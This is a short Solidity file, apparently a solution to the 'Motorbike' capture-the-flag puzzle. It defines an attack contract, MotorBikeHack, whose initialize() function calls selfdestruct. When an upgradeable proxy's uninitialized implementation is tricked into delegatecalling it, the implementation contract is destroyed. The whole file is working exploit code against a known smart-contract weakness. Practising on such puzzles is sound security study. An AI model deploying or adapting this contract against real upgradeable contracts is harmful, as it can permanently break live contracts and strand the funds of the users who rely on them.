// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract MotorBikeHack {

    function initialize() external {
        selfdestruct(payable(msg.sender));
    }

}